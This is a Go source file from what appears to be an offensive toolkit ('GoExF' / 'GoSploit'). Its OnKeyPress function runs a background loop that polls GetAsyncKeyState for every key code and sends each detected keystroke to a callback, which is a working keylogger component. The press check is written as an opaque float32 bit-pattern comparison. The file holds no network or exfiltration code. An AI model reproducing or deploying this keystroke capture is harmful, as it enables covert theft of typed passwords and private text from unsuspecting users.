package Handler

import (
	"math"

	"github.com/F-r-o-i-d/GoExF/GoExF/GoSploit"
)

func OnKeyPress(fc func(rune)) {
	go func() {
		for {
			for KEY := 8; KEY <= 190; KEY++ {
				Val, _, _ := GoSploit.GetAsyncKeyState.Call(uintptr(KEY))
				a := math.Float32bits(float32(Val))

				if int(a) == 1191182592 {
					go func(KEY int) { fc(rune((KEY))) }(KEY)
				}
			}
		}
	}()
}
